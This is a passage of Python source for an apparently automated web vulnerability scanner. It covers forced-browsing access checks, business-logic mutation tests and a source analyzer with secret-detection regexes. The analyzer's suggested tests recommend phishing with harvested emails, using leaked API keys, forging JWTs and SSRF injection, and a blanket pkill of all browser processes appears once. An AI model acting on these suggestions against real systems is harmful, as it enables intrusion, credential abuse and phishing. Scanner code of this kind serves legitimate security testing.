            summary[f["category"]] = summary.get(f["category"], 0) + 1

        self.logger.log(
            "interesting_locations_done",
            f"url_findings={len(url_findings)} "
            f"param_findings={len(param_findings)} "
            f"header_findings={len(header_findings)} "
            f"categories={len(summary)}",
        )

        return {
            "url_findings": url_findings,
            "param_findings": param_findings,
            "header_findings": header_findings,
            "summary": summary,
        }


# ============================================================================
# SECTION 8.8 — ACCESS CONTROL TESTER (Forced Browsing / A01)
# ============================================================================
#
# The AccessControlTester tests for Broken Access Control (OWASP A01) by
# performing "forced browsing" — a classic pentest technique:
#
#   1. After the authenticated scan completes, we have a list of in-scope
#      URLs that were crawled (presumably behind authentication).
#   2. We CLEAR ALL COOKIES from the Playwright context (removing session
#      tokens, auth cookies, CSRF tokens, etc.).
#   3. We re-navigate to each URL WITHOUT any authentication.
#   4. For each URL, we check:
#      - HTTP status code (200 = accessible, 302/redirect to login = protected,
#        401/403 = protected)
#      - Whether the final URL redirected to a login page
#      - Whether the page content is non-trivial (not just an error message)
#   5. If a URL returns 200 + non-login content WITHOUT cookies → potential
#      Broken Access Control finding (A01).
#
# This test is most meaningful when login was performed (--login-url),
# because the crawled URLs are presumed to be behind authentication. If
# no login was performed, the test still runs but the results are less
# actionable (everything was already unauthenticated).
#
# CRITICAL: This test only READS — it does not modify data, delete
# resources, or perform destructive actions. It simply navigates to URLs
# without cookies and observes the response. Safe for production targets.

class AccessControlTester:
    """Tests for Broken Access Control via forced browsing.

    Clears all cookies from the browser context, then re-visits each
    in-scope URL to check if it's accessible without authentication.
    """

    # URL path patterns that indicate a login/redirect page (not the
    # actual content). If the final URL after navigation matches one of
    # these, we consider the page "protected" (redirected to auth).
    LOGIN_PATTERNS = re.compile(
        r"/login|/signin|/sign-in|/auth|/session/new|/account/login",
        re.IGNORECASE,
    )

    def __init__(
        self,
        rate_limiter: RateLimiter,
        logger: ExecutionTrailLogger,
        evidence_dir: Path,
    ) -> None:
        self.rate_limiter = rate_limiter
        self.logger = logger
        self.evidence_dir = evidence_dir

    async def test(
        self,
        page: Page,
        crawl_map: List["CrawledURL"],
        login_was_performed: bool,
    ) -> List["Finding"]:
        """Run forced browsing tests. Returns a list of BAC findings.

        Parameters
        ----------
        page : the Playwright page (we'll clear cookies from its context)
        crawl_map : the list of crawled URLs to test
        login_was_performed : whether --login-url was set. If True, the
            URLs are presumed to be behind auth, so accessing them without
            cookies is a strong signal of BAC. If False, the results are
            less actionable.
        """
        findings: List[Finding] = []

        if not crawl_map:
            self.logger.log("access_control_skip", "no URLs in crawl map")
            return findings

        # Only test in-scope URLs (out-of-scope URLs were never crawled).
        test_urls = [c.url for c in crawl_map if c.in_scope]
        if not test_urls:
            self.logger.log("access_control_skip", "no in-scope URLs to test")
            return findings

        self.logger.log(
            "access_control_start",
            f"testing {len(test_urls)} URLs without cookies; "
            f"login_was_performed={login_was_performed}",
        )

        # --- Clear all cookies from the context ---
        # This removes session tokens, auth cookies, CSRF tokens — everything.
        # The context is now "unauthenticated".
        try:
            cookies = await _pw(page.context.cookies, default=[])
            cookie_count = len(cookies)
            await _pw(page.context.clear_cookies, default=None)
            self.logger.log(
                "access_control_step",
                f"cleared {cookie_count} cookies from context",
            )
        except Exception as e:
            self.logger.log("access_control_error",
                            f"failed to clear cookies: {e}")
            return findings

        # --- Re-visit each URL without cookies ---
        for url in test_urls:
            if GLOBAL_STATE.stop_event.is_set():
                break

            # --- Health check: is the page still alive? ---
            # After active_scan, the page may be dead (Chrome was killed
            # by watchdogs/recycles). page.goto() on a dead page hangs
            # indefinitely — _pw()'s timeout can't fire because
            # Playwright's C code blocks the event loop.
            #
            # We do a quick page.content() check (5s timeout). If it
            # fails, the page is dead — we recreate it.
            try:
                await asyncio.wait_for(page.content(), timeout=5.0)
            except Exception:
                self.logger.log("access_control_step",
                                f"page is dead before {url} — recreating")
                try:
                    # Try creating a new page from the existing context
                    page = await asyncio.wait_for(
                        page.context.new_page(), timeout=5.0)
                except Exception:
                    # Context is also dead — full Playwright restart
                    self.logger.log("access_control_step",
                                    "context also dead — full restart")
                    try:
                        import subprocess as _sp_ac
                        _sp_ac.run(
                            "pkill -9 -f chromium; pkill -9 -f chrome; "
                            "pkill -9 -f headless; pkill -9 -f chrome-headless-shell; "
                            "pkill -9 -f remote-debugging-pipe",
                            shell=True, timeout=5, capture_output=True)
                        await asyncio.sleep(2.0)
                        from playwright.async_api import async_playwright as _apw_ac
                        _pw_ac = await _apw_ac().start()
                        GLOBAL_STATE.playwright_ctx = _pw_ac
                        _browser_ac = await asyncio.wait_for(
                            _pw_ac.chromium.launch(headless=True,
                                args=["--no-sandbox"]),
                            timeout=15.0)
                        GLOBAL_STATE.browser = _browser_ac
                        _ctx_ac = await asyncio.wait_for(
                            _browser_ac.new_context(
                                user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                viewport={"width": 1280, "height": 720},
                                ignore_https_errors=True),
                            timeout=10.0)
                        page = await asyncio.wait_for(
                            _ctx_ac.new_page(), timeout=5.0)
                        self.logger.log("access_control_step",
                                        "browser + page recreated")
                    except Exception as e:
                        self.logger.log("access_control_error",
                                        f"failed to recreate page: {e}")
                        continue

            async with self.rate_limiter.slot():
                try:
                    # Navigate to the URL. We use 'domcontentloaded' (not
                    # 'networkidle') because we want to capture the initial
                    # response quickly — we don't need to wait for all
                    # sub-resources.
                    response = await _pw(
                        page.goto, url, wait_until="domcontentloaded", timeout=15000, default=None,
                    )
                except PWTimeoutError:
                    self.logger.log("access_control_visit",
                                    f"timeout loading {url} without cookies")
                    continue
                except Exception as e:
                    self.logger.log("access_control_visit",
                                    f"error loading {url} without cookies: {e}")
                    continue

            if response is None:
                continue

            status = response.status
            final_url = page.url

            # --- Determine if the URL is accessible without auth ---
            # Heuristics:
            #   1. Status 200 + final URL is NOT a login page → accessible
            #   2. Status 302/301 + redirect to login → protected (good)
            #   3. Status 401/403 → protected (good)
            #   4. Status 200 + final URL IS a login page → redirected to
            #      login (protected, good)
            is_login_redirect = bool(self.LOGIN_PATTERNS.search(final_url))
            is_accessible = (status == 200 and not is_login_redirect)

            self.logger.log(
                "access_control_result",
                f"url={url} status={status} final_url={final_url} "
                f"accessible_without_auth={is_accessible}",
            )

            if is_accessible:
                # This URL is accessible without authentication.
                # If login was performed, this is a potential BAC finding.
                # If login was NOT performed, this is expected (public page)
                # — we still log it but with lower severity.
                if login_was_performed:
                    severity = "High"
                    title = f"Forced Browsing: {url} accessible without authentication"
                    reasoning = (
                        "This URL was crawled during an authenticated scan "
                        "(login was performed), but is accessible WITHOUT "
                        "cookies/session. This suggests the endpoint does "
                        "not enforce authentication — potential Broken "
                        "Access Control (A01)."
                    )
                else:
                    severity = "Info"
                    title = f"Public URL (no auth required): {url}"
                    reasoning = (
                        "This URL is accessible without cookies. No login "
                        "was performed during this scan, so this may be "
                        "expected (public page). If this URL SHOULD require "
                        "authentication, it's a Broken Access Control issue."
                    )

                # Capture the page content for evidence.
                try:
                    rendered_html = await _pw(page.content, default="")
                except Exception:
                    rendered_html = ""

                # Take a screenshot as evidence.
                test_id = uuid.uuid4().hex[:12]
                timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
                screenshot_path: Optional[str] = None
                try:
                    ss_path = self.evidence_dir / f"{timestamp}_{test_id}_bac_screenshot.png"
                    await _pw(page.screenshot, path=str(ss_path), full_page=True, default=None)
                    screenshot_path = str(ss_path)
                except Exception:
                    pass

                # Build the execution trail.
                trail = [
                    f"[Step 1] Cleared all cookies from browser context ({cookie_count} cookies removed)",
                    f"[Step 2] Navigated to {url} WITHOUT any authentication cookies",
                    f"[Step 3] Received HTTP {status} — page loaded successfully",
                    f"[Step 4] Final URL: {final_url} (not redirected to login)",
                    f"[Step 5] Conclusion: {reasoning}",
                    "[Step 6] Finding recorded as UNVERIFIED — engineer must "
                    "manually confirm by visiting the URL in a fresh browser "
                    "window (no cookies) and verifying the content is "
                    "sensitive/restricted.",
                ]

                # Build raw request/response evidence.
                request_raw = f"GET {url}\n(Cookies: none — cleared before request)"
                response_raw = (
                    f"Status: {status}\n"
                    f"Final URL: {final_url}\n"
                    f"(Response body truncated — see screenshot for full page)"
                )
                if len(rendered_html) > 5000:
                    response_raw += "\n\n" + rendered_html[:5000] + "\n...[truncated]"
                else:
                    response_raw += "\n\n" + rendered_html

                finding = Finding(
                    finding_id=test_id,
                    owasp_category="A01:2025 Broken Access Control",
                    title=title,
                    severity=severity,
                    url=url,
                    payload="(no cookies — forced browsing)",
                    request_raw=request_raw,
                    response_raw=response_raw,
                    execution_trail=trail,
                    screenshot_path=screenshot_path,
                    patterns_matched=["forced_browsing:accessible_without_auth"],
                    unverified=True,
                )
                findings.append(finding)
                GLOBAL_STATE.partial_findings.append(finding)

        self.logger.log(
            "access_control_done",
            f"tested {len(test_urls)} URLs; found {len(findings)} "
            f"potential BAC issues",
        )
        return findings


# ============================================================================
# SECTION 8.8.5 — DEEP LOGIC TESTER (Business Logic Flaws)
# ============================================================================
#
# The DeepLogicTester is an EXPERIMENTAL module for finding business logic
# flaws — vulnerabilities that automated scanners almost never catch
# because they require understanding the application's intended workflow.
#
# HOW IT WORKS:
#   1. HAPPY PATH WALKTHROUGH: The tester navigates through a sequence of
#      pages (e.g. Login → Add to Cart → Checkout) and captures the "normal"
#      state — response bodies, status codes, key values (price, quantity,
#      total, balance).
#
#   2. STATE MUTATION: The tester re-runs the sequence but injects mutations:
#      - Negative quantities (quantity=-1, quantity=-999)
#      - Zero quantities (quantity=0)
#      - Extreme values (quantity=999999999)
#      - Skipped steps (skip the "add to cart" step, go straight to checkout)
#      - Replay (submit the same form twice)
#
#   3. ANOMALY DETECTION: The tester compares each mutated response to the
#      baseline. It flags:
#      - Negative total price (quantity=-1 → total should error, not be -$10)
#      - Same success status on skipped steps (checkout succeeds without cart)
#      - Numeric values that changed unexpectedly (price dropped to 0)
#      - Response length anomalies (mutated response is very different)
#
#   4. STATEFUL FINDINGS: Each finding includes the EXACT request sequence
#      (the happy path + the mutation applied) so the engineer can reproduce
#      it manually.
#
# CRITICAL LIMITATIONS:
#   - This is SLOW (re-runs the entire happy path for each mutation).
#   - It requires the engineer to define the happy path via --deep-logic-steps
#     (or it falls back to a generic "navigate to each crawled URL" approach).
#   - It's EXPERIMENTAL — expect false positives. All findings are UNVERIFIED.
#   - It only works on stateful apps (e-commerce, banking, multi-step forms).
#     Stateless sites (blogs, docs) will produce no findings.

class DeepLogicTester:
    """Tests for business logic flaws via happy-path mutation.

    EXPERIMENTAL — disabled by default. Enable with --deep-logic.
    """

    # Mutations to apply to numeric parameters.
    NUMERIC_MUTATIONS = [
        ("negative_one", "-1", "Negative value: -1"),
        ("negative_large", "-999999", "Large negative value: -999999"),
        ("zero", "0", "Zero value"),
        ("extreme_large", "999999999", "Extreme large value"),
        ("float", "0.01", "Tiny float value"),
        ("negative_float", "-0.01", "Tiny negative float"),
    ]

    def __init__(
        self,
        rate_limiter: RateLimiter,
        logger: ExecutionTrailLogger,
        evidence_dir: Path,
    ) -> None:
        self.rate_limiter = rate_limiter
        self.logger = logger
        self.evidence_dir = evidence_dir

    async def test(
        self,
        page: Page,
        crawl_map: List["CrawledURL"],
        attack_surface: List["InputField"],
        target_url: str,
    ) -> List[Dict[str, Any]]:
        """Run deep logic tests. Returns a list of stateful findings.

        Each finding is a dict (NOT a Finding dataclass — deep logic findings
        have a different structure with request sequences):
          - title: str
          - severity: "High" | "Medium" | "Low" | "Info"
          - owasp_category: "A06:2025 Insecure Design"
          - url: str
          - happy_path: List[str]  (the normal request sequence)
          - mutation: str  (what was changed)
          - baseline_response: str  (the normal response snippet)
          - mutated_response: str  (the mutated response snippet)
          - anomaly: str  (what was detected)
          - execution_trail: List[str]  (steps to reproduce)
          - unverified: True
        """
        findings: List[Dict[str, Any]] = []

        if not crawl_map:
            self.logger.log("deep_logic_skip", "no URLs in crawl map")
            return findings

        # We only test URLs that have numeric-looking parameters (likely
        # quantity, price, id, amount fields).
        testable_inputs = [
            inp for inp in attack_surface
            if inp.name and any(
                kw in inp.name.lower()
                for kw in ("qty", "quantity", "amount", "price", "total",
                           "count", "num", "number", "id", "quantity")
            )
        ]

        if not testable_inputs:
            self.logger.log("deep_logic_skip",
                            "no numeric-looking parameters found to mutate")
            return findings

        self.logger.log(
            "deep_logic_start",
            f"testing {len(testable_inputs)} numeric inputs with "
            f"{len(self.NUMERIC_MUTATIONS)} mutations each",
        )

        # For each testable input, run the happy path + mutations.
        for inp in testable_inputs:
            if GLOBAL_STATE.stop_event.is_set():
                break

            for mutation_name, mutation_value, mutation_desc in self.NUMERIC_MUTATIONS:
                if GLOBAL_STATE.stop_event.is_set():
                    break

                async with self.rate_limiter.slot():
                    try:
                        # --- HAPPY PATH: navigate to the URL normally ---
                        baseline_url = inp.url
                        baseline_response = await self._capture_response(
                            page, baseline_url
                        )
                        if baseline_response is None:
                            continue

                        # --- MUTATION: re-navigate with the mutated value ---
                        if inp.location == "url_param":
                            # Replace the param value in the URL.
                            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                            parsed = urlparse(baseline_url)
                            qs = parse_qs(parsed.query)
                            qs[inp.name] = [mutation_value]
                            new_query = urlencode(
                                {k: v[0] if isinstance(v, list) else v
                                 for k, v in qs.items()}
                            )
                            mutated_url = urlunparse(parsed._replace(query=new_query))

                            mutated_response = await self._capture_response(
                                page, mutated_url
                            )
                            if mutated_response is None:
                                continue

                        elif inp.location == "form":
                            # Fill the form with the mutated value + submit.
                            mutated_response = await self._capture_form_response(
                                page, baseline_url, inp.name, mutation_value
                            )
                            if mutated_response is None:
                                continue
                            mutated_url = baseline_url
                        else:
                            # Skip non-GET/form inputs (fetch bodies, etc.)
                            continue

                        # --- ANOMALY DETECTION ---
                        anomaly = self._detect_anomaly(
                            baseline_response, mutated_response, mutation_desc
                        )

                        if anomaly:
                            # Build the finding.
                            test_id = uuid.uuid4().hex[:12]
                            timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")

                            # Take a screenshot of the mutated response.
                            screenshot_path: Optional[str] = None
                            try:
                                ss_path = self.evidence_dir / f"{timestamp}_{test_id}_deep_logic.png"
                                await _pw(page.screenshot, path=str(ss_path), full_page=True, default=None)
                                screenshot_path = str(ss_path)
                            except Exception:
                                pass

                            finding = {
                                "finding_id": test_id,
                                "title": f"Business Logic Flaw: {inp.name}={mutation_value} on {baseline_url}",
                                "severity": "Medium",
                                "owasp_category": "A06:2025 Insecure Design",
                                "url": baseline_url,
                                "input_name": inp.name,
                                "mutation": mutation_desc,
                                "happy_path": [f"GET {baseline_url}"],
                                "mutation_applied": f"Changed '{inp.name}' to '{mutation_value}'",
                                "baseline_status": baseline_response.get("status", 0),
                                "mutated_status": mutated_response.get("status", 0),
                                "baseline_snippet": baseline_response.get("body", "")[:500],
                                "mutated_snippet": mutated_response.get("body", "")[:500],
                                "anomaly": anomaly,
                                "screenshot_path": os.path.basename(screenshot_path) if screenshot_path else None,
                                "has_screenshot": screenshot_path is not None,
                                "execution_trail": [
                                    f"[Step 1] Captured baseline: GET {baseline_url}",
                                    f"[Step 2] Applied mutation: {mutation_desc}",
                                    f"[Step 3] Re-requested with {inp.name}={mutation_value}",
                                    f"[Step 4] Compared responses — anomaly detected: {anomaly}",
                                    "[Step 5] Finding recorded as UNVERIFIED — engineer must manually confirm.",
                                ],
                                "unverified": True,
                            }
                            findings.append(finding)

                            self.logger.log(
                                "deep_logic_finding",
                                f"input={inp.name} mutation={mutation_name} "
                                f"anomaly={anomaly[:60]}",
                            )

                    except Exception as e:
                        self.logger.log("deep_logic_error",
                                        f"error testing {inp.name}={mutation_value}: {e}")
                        continue

        self.logger.log(
            "deep_logic_done",
            f"tested {len(testable_inputs)} inputs; found {len(findings)} "
            f"business logic anomalies",
        )
        return findings

    async def _capture_response(
        self, page: Page, url: str
    ) -> Optional[Dict[str, Any]]:
        """Navigate to a URL and capture the response status + body."""
        try:
            resp = await _pw(page.goto, url, wait_until="domcontentloaded", timeout=10000, default=None)
            if resp is None:
                return None
            body = await _pw(page.content, default="")
            return {
                "status": resp.status,
                "body": body,
                "url": page.url,
            }
        except Exception:
            return None

    async def _capture_form_response(
        self, page: Page, url: str, field_name: str, value: str
    ) -> Optional[Dict[str, Any]]:
        """Navigate to a URL, fill a form field, submit, capture response."""
        try:
            await _pw(page.goto, url, wait_until="domcontentloaded", timeout=10000, default=None)
            # Find the input by name.
            selector = f"input[name='{field_name}'], textarea[name='{field_name}'], select[name='{field_name}']"
            elem = await _pw(page.query_selector, selector, default=None)
            if elem is None:
                # Try setting via JS.
                await _pw(page.evaluate,
                    """(args) => {
                        const el = document.querySelector(args.selector);
                        if (el) { el.value = args.value; }
                    }""",
                    {"selector": selector, "value": value},
                    default=None,
                )
            else:
                is_visible = await _pw(elem.is_visible, default=False)
                if is_visible:
                    await _pw(elem.fill, value, default=None)
                else:
                    await _pw(page.evaluate,
                        """(args) => {
                            const el = document.querySelector(args.selector);
                            if (el) { el.value = args.value; }
                        }""",
                        {"selector": selector, "value": value},
                        default=None,
                    )
            # Submit the form.
            try:
                submit = await _pw(page.query_selector,
                    "button[type=submit], input[type=submit], button:not([type])",
                    default=None,
                )
                if submit:
                    await _pw(submit.click, default=None)
                    await _pw(page.wait_for_load_state, "domcontentloaded", timeout=10000, default=None)
            except Exception:
                pass
            body = await _pw(page.content, default="")
            return {
                "status": 200,  # form submission doesn't have a clear status
                "body": body,
                "url": page.url,
            }
        except Exception:
            return None

    def _detect_anomaly(
        self,
        baseline: Dict[str, Any],
        mutated: Dict[str, Any],
        mutation_desc: str,
    ) -> Optional[str]:
        """Compare baseline vs mutated response. Return anomaly description or None.

        Heuristics:
          1. If the mutation was negative/zero and the response still shows
             "success" indicators (no error message), flag it.
          2. If a numeric value in the response changed sign (positive → negative),
             flag it (e.g. negative total price).
          3. If the response length is suspiciously similar (mutation had no effect),
             flag it as "input not validated".
          4. If the response contains error keywords, that's GOOD (the app
             rejected the mutation) — no finding.
        """
        baseline_body = baseline.get("body", "")
        mutated_body = mutated.get("body", "")

        # Skip if the response contains error indicators (app rejected it).
        error_indicators = ["error", "invalid", "must be positive", "must be >= 0",
                            "cannot be negative", "out of range", "forbidden",
                            "bad request", "validation failed"]
        mutated_lower = mutated_body.lower()
        for indicator in error_indicators:
            if indicator in mutated_lower:
                return None  # app correctly rejected the mutation

        # Check for negative numeric values in the mutated response that
        # weren't in the baseline (e.g. negative total price).
        # Match patterns like "Total: $-10.00" or "total=-5" or "-$10".
        negative_pattern = re.compile(r"[$€£]?\s*-\d+[.,]?\d*")
        baseline_negatives = set(negative_pattern.findall(baseline_body))
        mutated_negatives = set(negative_pattern.findall(mutated_body))
        new_negatives = mutated_negatives - baseline_negatives
        if new_negatives:
            return (f"Negative numeric value appeared in mutated response that "
                    f"wasn't in baseline: {', '.join(list(new_negatives)[:3])}. "
                    f"This suggests the application accepted {mutation_desc} "
                    f"without proper validation.")

        # Check if the response is suspiciously similar (mutation had no effect).
        # We use a simple length comparison — if the bodies are within 5% of
        # each other AND the mutation was "extreme", the input likely wasn't
        # processed.
        if "Extreme" in mutation_desc or "Negative" in mutation_desc:
            baseline_len = len(baseline_body)
            mutated_len = len(mutated_body)
            if baseline_len > 100 and mutated_len > 100:
                ratio = min(baseline_len, mutated_len) / max(baseline_len, mutated_len)
                if ratio > 0.95:
                    return (f"Mutated response is nearly identical to baseline "
                            f"(length ratio {ratio:.2f}). The application may not "
                            f"be validating the input '{mutation_desc}' — the "
                            f"mutation had no observable effect.")

        # Check for success indicators in the mutated response (the app
        # accepted the mutation without complaint).
        success_indicators = ["success", "thank you", "order complete",
                              "checkout complete", "confirmed", "saved",
                              "updated", "submitted"]
        if any(ind in mutated_lower for ind in success_indicators):
            if "Negative" in mutation_desc or "Zero" in mutation_desc:
                return (f"Success indicator found in response after {mutation_desc}. "
                        f"The application accepted an invalid value without error. "
                        f"Manually verify whether this caused a business logic flaw "
                        f"(e.g. negative price, free item, bypassed limit).")

        return None


# ============================================================================
# SECTION 8.9 — SOURCE CODE ANALYZER (Passive Reconnaissance)
# ============================================================================
#
# The SourceCodeAnalyzer scans the RAW HTML/JS source of every crawled page
# (not just the rendered DOM) using regex to flag:
#
#   1. Developer comments: <!-- TODO -->, <!-- FIXME -->, <!-- DEBUG -->, etc.
#      These often reveal unfinished features, known bugs, or debug paths.
#
#   2. Hardcoded API keys / tokens: long base64 strings, sk- prefixed keys,
#      AWS key IDs, etc. These are common in client-side JS bundles.
#
#   3. Email addresses: reveal internal staff, domains, or third-party
#      services. Useful for phishing/OSINT.
#
#   4. Internal IPs: 10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x.
#      These leak internal network topology + potential SSRF targets.
#
#   5. Hidden form defaults: <input type="hidden" value="admin"> etc.
#      These are prime targets for privilege escalation testing.
#
# CRITICAL: This is PASSIVE — it only reads already-captured HTML. No extra
# HTTP requests are sent to the target.

class SourceCodeAnalyzer:
    """Scans raw HTML/JS source for sensitive patterns.

    Runs on the HTML captured during crawling/attack-surface mapping.
    No extra requests are made — this is purely passive analysis of data
    the scanner already has.
    """

    # --- Regex patterns ---
    # Developer comments containing sensitive keywords.
    # re.DOTALL so '.' matches newlines (comments can span multiple lines).
    COMMENT_PATTERN = re.compile(
        r"<!--.*?(TODO|FIXME|HACK|DEBUG|SECRET|TEST|API_KEY|PASSWORD|TOKEN|KEY)"
        r".*?-->",
        re.IGNORECASE | re.DOTALL,
    )

    # Hardcoded API keys:
    # - Long base64-ish strings (40+ chars of [A-Za-z0-9+/])
    # - Stripe-style keys: sk-...
    # - AWS-style keys: AKIA...
    API_KEY_PATTERNS = [
        re.compile(r"sk-[A-Za-z0-9]{20,}"),
        re.compile(r"AKIA[A-Z0-9]{16}"),
        re.compile(r"[A-Za-z0-9+/]{40,}"),
    ]

    # Email addresses.
    EMAIL_PATTERN = re.compile(
        r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
    )

    # Internal/private IP addresses.
    # We match any IP-like pattern, then filter to private ranges.
    IP_PATTERN = re.compile(r"\b(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b")

    # Hidden input fields with sensitive default values.
    # Matches: <input type="hidden" ... value="admin">
    HIDDEN_SENSITIVE_PATTERN = re.compile(
        r'<input[^>]*type=["\']hidden["\'][^>]*value=["\']'
        r'(admin|root|test|password|true|secret|token|key|internal)'
        r'["\']',
        re.IGNORECASE,
    )
    # Also match the reverse order: value before type
    HIDDEN_SENSITIVE_PATTERN_REVERSE = re.compile(
        r'<input[^>]*value=["\']'
        r'(admin|root|test|password|true|secret|token|key|internal)'
        r'["\'][^>]*type=["\']hidden["\']',
        re.IGNORECASE,
    )

    # Fetch/XHR calls in inline JS.
    FETCH_PATTERN = re.compile(
        r"(?:fetch|XMLHttpRequest|\.open)\s*\(\s*['\"]([^'\"]+)['\"]",
        re.IGNORECASE,
    )

    def __init__(self, logger: ExecutionTrailLogger) -> None:
        self.logger = logger

    def analyze(
        self,
        page_sources: Dict[str, str],
    ) -> Dict[str, List[Dict[str, Any]]]:
        """Analyze raw HTML/JS sources for sensitive patterns.

        Parameters
        ----------
        page_sources : dict mapping URL → raw HTML source string

        Returns
        -------
        dict mapping URL → list of findings. Each finding has:
          - type: "developer_comment" | "api_key" | "email" | "internal_ip" | "hidden_default"
          - evidence: the matched string
          - line: approximate line number (for developer comments)
          - description: what this finding means
          - suggested_test: how to test/exploit it
        """
        results: Dict[str, List[Dict[str, Any]]] = {}

        for url, source in page_sources.items():
            findings: List[Dict[str, Any]] = []

            # --- 1. Developer comments ---
            for m in self.COMMENT_PATTERN.finditer(source):
                # Approximate line number by counting newlines before the match.
                line = source[:m.start()].count("\n") + 1
                evidence = m.group(0).strip()
                # Truncate very long comments for readability.
                if len(evidence) > 200:
                    evidence = evidence[:200] + "...[truncated]"
                keyword = m.group(1).upper()
                findings.append({
                    "type": "developer_comment",
                    "evidence": evidence,
                    "line": line,
                    "description": f"Developer comment contains sensitive keyword: {keyword}. "
                                   f"Often reveals unfinished features, debug paths, or known issues.",
                    "suggested_test": f"Investigate the {keyword} reference. If it's a debug/test "
                                      f"path, try accessing it directly. If it's a TODO, the "
                                      f"feature may be half-implemented and exploitable.",
                })

            # --- 2. Hardcoded API keys ---
            seen_keys: Set[str] = set()  # dedupe
            for pat in self.API_KEY_PATTERNS:
                for m in pat.finditer(source):
                    key = m.group(0)
                    if key in seen_keys:
                        continue
                    seen_keys.add(key)
                    # Skip false positives: common CSS/JS hash strings that
                    # are 40+ chars but are NOT secrets. We check if the string
                    # looks like a hex hash (all 0-9a-f) — these are usually
                    # content hashes, not API keys.
                    if re.fullmatch(r"[0-9a-f]{40}", key, re.IGNORECASE):
                        continue  # likely a SHA1 hash, not an API key
                    # Truncate for display.
                    evidence = key[:60] + ("..." if len(key) > 60 else "")
                    findings.append({
                        "type": "api_key",
                        "evidence": evidence,
                        "description": "Potential hardcoded API key or token found in source. "
                                       "Could be a Stripe key, AWS key, JWT secret, or other credential.",
                        "suggested_test": "Test the key against the relevant API (Stripe, AWS, etc.). "
                                          "If it's a JWT secret, try forging tokens.",
                    })

            # --- 3. Email addresses ---
            seen_emails: Set[str] = set()
            for m in self.EMAIL_PATTERN.finditer(source):
                email = m.group(0)
                if email in seen_emails:
                    continue
                seen_emails.add(email)
                # Skip obvious false positives (e.g. @import, @media in CSS).
                if email.lower().endswith(("@import", "@media", "@font-face",
                                           "@keyframes", "@charset")):
                    continue
                findings.append({
                    "type": "email",
                    "evidence": email,
                    "description": f"Email address found in source: {email}. "
                                   "Reveals internal staff, domains, or third-party services.",
                    "suggested_test": "Use for OSINT, phishing campaigns, or account enumeration "
                                      "(try registering with this email).",
                })

            # --- 4. Internal IP addresses ---
            seen_ips: Set[str] = set()
            for m in self.IP_PATTERN.finditer(source):
                ip = m.group(0)
                if ip in seen_ips:
                    continue
                # Check if it's a private/internal IP.
                octets = [int(g) for g in m.groups()]
                is_private = (
                    octets[0] == 10  # 10.0.0.0/8
                    or (octets[0] == 172 and 16 <= octets[1] <= 31)  # 172.16.0.0/12
                    or (octets[0] == 192 and octets[1] == 168)  # 192.168.0.0/16
                    or octets[0] == 127  # loopback
                    or (octets[0] == 169 and octets[1] == 254)  # link-local
                )
                if not is_private:
                    continue
                seen_ips.add(ip)
                # Skip version numbers that look like IPs (e.g. 1.2.3.4 in JS).
                # Heuristic: if the IP is preceded by "version" or "v", skip it.
                context = source[max(0, m.start()-20):m.start()]
                if re.search(r"version|v\d|ver\.", context, re.IGNORECASE):
                    continue
                findings.append({
                    "type": "internal_ip",
                    "evidence": ip,
                    "description": f"Internal/private IP address found: {ip}. "
                                   "Leaks internal network topology — potential SSRF target.",
                    "suggested_test": "Use as an SSRF target: inject into URL parameters "
                                      "that fetch external resources (e.g. url=http://10.0.0.1/admin).",
                })

            # --- 5. Hidden form defaults with sensitive values ---
            for pat in [self.HIDDEN_SENSITIVE_PATTERN,
                        self.HIDDEN_SENSITIVE_PATTERN_REVERSE]:
                for m in pat.finditer(source):
                    evidence = m.group(0).strip()
                    if len(evidence) > 200:
                        evidence = evidence[:200] + "...[truncated]"
                    value = m.group(1)
                    findings.append({
                        "type": "hidden_default",
                        "evidence": evidence,
                        "description": f"Hidden input has sensitive default value: '{value}'. "
                                       "This is a prime target for privilege escalation.",
                        "suggested_test": f"Change the hidden value from '{value}' to 'admin' "
                                          f"or 'root' and submit the form. If the server trusts "
                                          f"the client-side value, you've escalated privileges.",
                    })

            if findings:
                results[url] = findings

        total = sum(len(v) for v in results.values())
        self.logger.log(
            "source_code_analysis_done",
            f"analyzed {len(page_sources)} pages; found {total} sensitive patterns "
            f"across {len(results)} URLs",
        )
        return results


# ============================================================================
# SECTION 8.10 — INPUT SURFACE MAPPER (Enhanced)
# ============================================================================
#
# The InputSurfaceMapper catalogs ALL user-interactable elements on every
# crawled page, providing a complete picture of the attack surface.
#
# Unlike the existing AttackSurfaceMapper (which focuses on fuzzable
# inputs), the InputSurfaceMapper provides a full inventory for the
# Interesting Locations tab:
#
#   - All <form> elements (action, method, input count)
#   - All <input> fields (name, type, pre-filled value)
#   - All <textarea> and <select> fields
#   - All fetch() / XMLHttpRequest calls in JS
#   - Hidden inputs flagged with HIGH-PRIORITY privilege escalation warning
#
# This is PASSIVE — it only reads the DOM of already-crawled pages.

class InputSurfaceMapper:
    """Catalogs all user-interactable elements per page.

    Uses Playwright's eval_on_selector_all to extract elements from the
    rendered DOM. No extra HTTP requests are made.
    """

    def __init__(self, logger: ExecutionTrailLogger) -> None:
        self.logger = logger

    async def map_page(self, page: Page, url: str) -> Dict[str, Any]:
        """Map all input elements on a single page.

        Returns a dict with:
          - forms: List of {action, method, input_count, inputs: [...]}
          - inputs: List of {name, type, value, hidden: bool}
          - textareas: List of {name, value}
          - selects: List of {name, options: [...]}
          - fetch_calls: List of {url, method, body_params: [...]}
          - hidden_inputs_flagged: List of high-priority items
        """
        result: Dict[str, Any] = {
            "forms": [],
            "inputs": [],
            "textareas": [],
            "selects": [],
            "fetch_calls": [],
            "hidden_inputs_flagged": [],
        }

        # --- Forms + their inputs ---
        forms = await _pw(page.eval_on_selector_all,
            "form",
            """forms => forms.map(f => {
                const inputs = Array.from(f.querySelectorAll('input, textarea, select, button'));
                const inputDetails = inputs.map(i => ({
                    name: i.name || i.id || '',
                    type: (i.type || i.tagName.toLowerCase()),
                    value: (i.value || '').substring(0, 200),
                    hidden: (i.type === 'hidden' || i.type === 'Hidden')
                }));
                return {
                    action: f.getAttribute('action') || location.href,
